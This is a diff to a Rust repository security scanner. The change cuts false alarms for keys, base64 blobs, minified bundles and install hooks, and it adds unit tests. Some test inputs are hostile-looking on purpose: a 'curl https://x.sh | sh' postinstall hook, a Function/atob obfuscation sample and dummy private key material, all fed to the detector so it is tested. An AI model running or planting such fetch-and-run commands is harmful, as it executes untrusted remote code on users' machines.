@@ -12,7 +12,9 @@
 //! Each finding carries a severity (how bad it would be) and a confidence
 //! (how likely it is a real problem rather than a false alarm). Findings in
 //! tests, docs, examples and fixtures are lowered one step on both, since
-//! that code is not what users of the project run.
+//! that code is not what users of the project run. Keys there are usually
+//! dummies, so they drop to low confidence, and long or encoded data in
+//! tests and fixtures is not reported at all.
 //!
 //! Files are only read, never executed, and nothing is sent over the network
 //! unless dependency checking is asked for (see [`crate::vulns`]): then the
@@ -186,10 +188,19 @@ pub fn scan(root: &Path, dependencies: Option<&dyn crate::vulns::Source>) -> Sca
             let relative = path.strip_prefix(root).unwrap_or(path);
             let relative = sanitize(&relative.to_string_lossy().replace('\\', "/"));
             let mut found = audit_file(&relative, &bytes);
+            let context = context_of(&relative);
+            if matches!(context, Some("test" | "fixture")) {
+                found.retain(|f| !is_fixture_data(f));
+            }
             found.truncate(PER_FILE_LIMIT);
-            if let Some(context) = context_of(&relative) {
+            if let Some(context) = context {
                 for f in &mut found {
                     lower(f, context);
+                    // Keys in tests and fixtures are almost always made up
+                    // for the test.
+                    if f.check == SECRET && matches!(context, "test" | "fixture") {
+                        f.confidence = Confidence::Low;
+                    }
                 }
             }
             found
@@ -338,6 +349,13 @@ fn context_of(file: &str) -> Option<&'static str> {
     None
 }
 
+/// Findings that tests and fixtures produce on purpose: long expected
+/// output, encoded sample data and odd characters in sample files.
+fn is_fixture_data(f: &Finding) -> bool {
+    f.check == MINIFIED
+        || (f.severity == Severity::Low && matches!(f.check, OBFUSCATION | HIDDEN_UNICODE))
+}
+
 /// Lower a finding one step on severity and confidence.
 fn lower(f: &mut Finding, context: &'static str) {
     f.severity = match f.severity {
@@ -385,10 +403,20 @@ fn audit_file(file: &str, bytes: &[u8]) -> Vec<Finding> {
     let text = String::from_utf8_lossy(bytes);
 
     let minified = lower_name.contains(".min.");
+    // Minifiers produce `Function(`, `atob(`, hex escapes and long
+    // strings, so these patterns say nothing about third-party bundles.
+    let third_party = minified
+        || lower_name.contains("-min.")
+        || text.starts_with("/*!")
+        || file
+            .to_ascii_lowercase()
+            .split('/')
+            .any(|dir| VENDOR_DIRS.contains(&dir));
     let mut blob_reported = false;
     let mut long_line_reported = false;
+    let lines: Vec<&str> = text.lines().collect();
 
-    for (index, line) in text.lines().enumerate() {
+    for (index, &line) in lines.iter().enumerate() {
         let n = Some(index + 1);
 
         if let Some(c) = line.chars().find(|c| is_bidi_control(*c)) {
@@ -421,7 +449,24 @@ fn audit_file(file: &str, bytes: &[u8]) -> Vec<Finding> {
             }
         }
 
+        let mut secret_on_line = false;
         for kind in find_secrets(line) {
+            if kind == "private key" && !pem_has_body(line, lines.get(index + 1).copied()) {
+                continue;
+            }
+            secret_on_line = true;
+            if kind == "Google API key" && line.to_ascii_lowercase().contains("firebase") {
+                let mut f = finding(
+                    Severity::Low,
+                    SECRET,
+                    file,
+                    n,
+                    "Firebase web API key (value not shown). These ship to browsers by design; check that the project's rules restrict it.".to_string(),
+                );
+                f.confidence = Confidence::Low;
+                out.push(f);
+                continue;
+            }
             out.push(finding(
                 Severity::High,
                 SECRET,
@@ -431,7 +476,11 @@ fn audit_file(file: &str, bytes: &[u8]) -> Vec<Finding> {
             ));
         }
 
-        if !code {
+        if !code || third_party {
+            if code && !long_line_reported && !minified && line.len() >= LONG_LINE {
+                long_line_reported = true;
+                out.push(long_line(file, n, line));
+            }
             continue;
         }
 
@@ -458,9 +507,10 @@ fn audit_file(file: &str, bytes: &[u8]) -> Vec<Finding> {
         }
 
         let mut blob_on_line = false;
-        if !blob_reported && !minified {
+        if !blob_reported && !secret_on_line {
             let run = longest_base64_run(line);
-            if run >= BASE64_RUN {
+            if run.len() >= BASE64_RUN && !run.starts_with(WASM_BASE64) {
+                let run = run.len();
                 blob_reported = true;
                 blob_on_line = true;
                 out.push(finding(
@@ -473,18 +523,10 @@ fn audit_file(file: &str, bytes: &[u8]) -> Vec<Finding> {
             }
         }
 
-        if !long_line_reported && !minified && !blob_on_line && line.len() >= LONG_LINE {
+        if !long_line_reported && !blob_on_line && line.len() >= LONG_LINE && !is_number_data(line)
+        {
             long_line_reported = true;
-            out.push(finding(
-                Severity::Low,
-                MINIFIED,
-                file,
-                n,
-                format!(
-                    "Line of {} characters: minified or generated code is hard to review",
-                    line.len()
-                ),
-            ));
+            out.push(long_line(file, n, line));
         }
     }
 
@@ -498,6 +540,40 @@ fn audit_file(file: &str, bytes: &[u8]) -> Vec<Finding> {
         _ => {}
     }
     out
+}
+
+/// Folders that hold copies of other projects' code.
+const VENDOR_DIRS: &[&str] = &[
+    "vendor",
+    "vendors",
+    "third_party",
+    "third-party",
+    "thirdparty",
+    "bower_components",
+];
+
+fn long_line(file: &str, line: Option<usize>, text: &str) -> Finding {
+    finding(
+        Severity::Low,
+        MINIFIED,
+        file,
+        line,
+        format!(
+            "Line of {} characters: minified or generated code is hard to review",
+            text.len()
+        ),
+    )
+}
+
+/// Mostly numbers, such as SVG path data or a lookup table.
+fn is_number_data(line: &str) -> bool {
+    let numeric = line
+        .bytes()
+        .filter(|b| {
+            b.is_ascii_digit() || b.is_ascii_whitespace() || matches!(b, b'.' | b',' | b'-')
+        })
+        .count();
+    numeric * 10 >= line.len() * 9
 }
 
 // ---------------------------------------------------------------------------
@@ -562,23 +638,26 @@ fn is_base64_byte(b: u8) -> bool {
     b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_')
 }
 
+/// How a WebAssembly module (`\0asm` and a version) starts in base64.
+/// Bundlers inline compiled modules this way.
+const WASM_BASE64: &str = "AGFzbQ";
+
 /// Longest run of base64 characters on the line, ignoring `data:` URIs,
 /// which commonly embed small images and fonts.
-fn longest_base64_run(line: &str) -> usize {
+fn longest_base64_run(line: &str) -> &str {
     if line.len() < BASE64_RUN || line.contains("data:") {
-        return 0;
+        return "";
     }
-    let mut longest = 0;
-    let mut run = 0;
-    for &b in line.as_bytes() {
-        if is_base64_byte(b) {
-            run += 1;
-            longest = longest.max(run);
-        } else {
-            run = 0;
+    let bytes = line.as_bytes();
+    let (mut best, mut start) = (0..0, 0);
+    for (i, &b) in bytes.iter().enumerate() {
+        if !is_base64_byte(b) {
+            start = i + 1;
+        } else if i + 1 - start > best.len() {
+            best = start..i + 1;
         }
     }
-    longest
+    &line[best]
 }
 
 // ---------------------------------------------------------------------------
@@ -672,6 +751,25 @@ pub(crate) fn find_secrets(line: &str) -> Vec<&'static str> {
     kinds
 }
 
+/// Whether a private key header on `line` is followed by key material,
+/// on the same line (after an escaped newline) or the next. Placeholders
+/// such as `...`, `X` or a regex for the header have none.
+fn pem_has_body(line: &str, next: Option<&str>) -> bool {
+    const BODY: usize = 40;
+    let run = |s: &str| {
+        s.split(|c: char| !(c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='))
+            .map(str::len)
+            .max()
+            .unwrap_or(0)
+    };
+    let after = line
+        .find(PEM_PRIVATE)
+        .map_or("", |i| &line[i + PEM_PRIVATE.len()..])
+        .replace("\\r", " ")
+        .replace("\\n", " ");
+    run(&after) >= BODY || next.is_some_and(|n| run(n) >= BODY)
+}
+
 /// Documentation examples and obvious dummies.
 fn is_placeholder(body: &str) -> bool {
     let upper = body.to_ascii_uppercase();
@@ -713,6 +811,9 @@ fn package_json(file: &str, text: &str) -> Vec<Finding> {
         return out;
     };
 
+    // A private package is never installed as someone else's dependency,
+    // so its plain install hooks only run for its own developers.
+    let private = json.get("private").and_then(|p| p.as_bool()) == Some(true);
     if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
         for hook in INSTALL_HOOKS {
             let Some(command) = scripts.get(*hook).and_then(|c| c.as_str()) else {
@@ -730,7 +831,7 @@ fn package_json(file: &str, text: &str) -> Vec<Finding> {
                         risky.trim()
                     ),
                 ));
-            } else if *hook != "prepare" {
+            } else if *hook != "prepare" && !private {
                 out.push(finding(
                     Severity::Low,
                     INSTALL_SCRIPT,
@@ -889,7 +990,8 @@ const PYPI_POPULAR: &[&str] = &[
 /// Real, unrelated packages that happen to be one edit from a popular name.
 #[rustfmt::skip]
 const KNOWN_NEIGHBOURS: &[&str] = &[
-    "preact", "dotenvx", "torchx", "scapy", "jinja", "attr", "psycopg", "boto",
+    "preact", "dotenvx", "torchx", "scapy", "jinja", "attr", "psycopg", "boto", "colord",
+    "graphiql",
 ];
 
 /// The popular package `name` is one edit away from, if it is not that
@@ -1133,6 +1235,90 @@ mod tests {
     }
 
     #[test]
+    fn private_keys_need_key_material() {
+        let header = format!("{}RSA {}", PEM_BEGIN, PEM_PRIVATE);
+        let body = "MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8";
+        let real = format!("key = \"{header}\\n{body}\\n\"");
+        assert_eq!(checks(&audit_file("app.ts", real.as_bytes())), vec![SECRET]);
+        let split = format!("{header}\n{body}\n");
+        assert_eq!(
+            checks(&audit_file("server.key", split.as_bytes())),
+            vec![SECRET]
+        );
+        for fake in [
+            format!("p = \"{header}\\n...\\n\""),
+            format!("// Usually wrapped within {header} X -----END PRIVATE KEY-----."),
+            format!("{header}\nMIIEpAIBAAKCAQEA...\n"),
+        ] {
+            assert!(audit_file("app.ts", fake.as_bytes()).is_empty(), "{fake}");
+        }
+    }
+
+    #[test]
+    fn firebase_web_keys_are_low() {
+        let key = format!("{}{}", "AIza", "SyAd15pYlMci_xIp9ko6wkEsDzAAA0Dn0RU");
+        let found = audit_file(
+            ".env",
+            format!("FIREBASE_CONFIG='{{\"apiKey\":\"{key}\"}}'").as_bytes(),
+        );
+        assert_eq!(found[0].severity, Severity::Low);
+        assert_eq!(found[0].confidence, Confidence::Low);
+        let found = audit_file(".env", format!("MAPS_KEY={key}").as_bytes());
+        assert_eq!(found[0].severity, Severity::High);
+    }
+
+    #[test]
+    fn skips_patterns_bundlers_and_drawings_produce() {
+        let minified = format!(
+            "{}({}('YWxlcnQoMSk='));var s=\"{}\"",
+            "Function",
+            "atob",
+            "\\x41".repeat(50)
+        );
+        assert!(audit_file("lib/jquery.min.js", minified.as_bytes()).is_empty());
+        assert!(audit_file("vendor/d3.js", minified.as_bytes()).is_empty());
+        assert!(audit_file("lib/raphael-min.js", minified.as_bytes()).is_empty());
+
+        let wasm = format!("export default toBinary(`AGFzbQ{}`);", "QUJD".repeat(150));
+        assert!(audit_file("woff2-wasm.ts", wasm.as_bytes()).is_empty());
+
+        let path = format!("<path d=\"M{}\" />", "12.5 3.4-1.2 ".repeat(500));
+        assert!(audit_file("Logo.tsx", path.as_bytes()).is_empty());
+    }
+
+    #[test]
+    fn tests_and_fixtures_hold_dummy_keys_and_data() {
+        let dir = tempfile::tempdir().unwrap();
+        let header = format!("{}RSA {}", PEM_BEGIN, PEM_PRIVATE);
+        let body = "MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8";
+        fs::create_dir_all(dir.path().join("tests/certs")).unwrap();
+        fs::write(
+            dir.path().join("tests/certs/server.key"),
+            format!("{header}\n{body}\n"),
+        )
+        .unwrap();
+        fs::write(
+            dir.path().join("tests/expected_test.go"),
+            format!("var q = \"{}\"\n", "SELECT a ".repeat(800)),
+        )
+        .unwrap();
+        let report = audit(dir.path(), None);
+        assert_eq!(checks(&report.findings), vec![SECRET]);
+        assert_eq!(report.findings[0].confidence, Confidence::Low);
+    }
+
+    #[test]
+    fn private_packages_install_hooks_are_their_own() {
+        let pkg = r#"{"private": true, "scripts": {"postinstall": "prisma generate"}}"#;
+        assert!(audit_file("package.json", pkg.as_bytes()).is_empty());
+        let risky = format!(
+            r#"{{"private": true, "scripts": {{"postinstall": "{} https://x.sh | sh"}}}}"#,
+            "curl"
+        );
+        assert_eq!(audit_file("package.json", risky.as_bytes()).len(), 1);
+    }
+
+    #[test]
     fn flags_bidi_controls_in_code() {
         let src = "let ok = true; // \u{202E} } \u{2066}\nok";
         let found = audit_file("src/lib.rs", src.as_bytes());
@@ -1169,7 +1355,7 @@ mod tests {
         let found = audit_file("x.js", blob.as_bytes());
         assert_eq!(checks(&found), vec![OBFUSCATION]);
 
-        let long = format!("var a=[{}];", "1,".repeat(3_000));
+        let long = format!("var a=[{}];", "f(b),".repeat(1_200));
         assert_eq!(checks(&audit_file("x.js", long.as_bytes())), vec![MINIFIED]);
         assert!(audit_file("x.min.js", long.as_bytes()).is_empty());
 
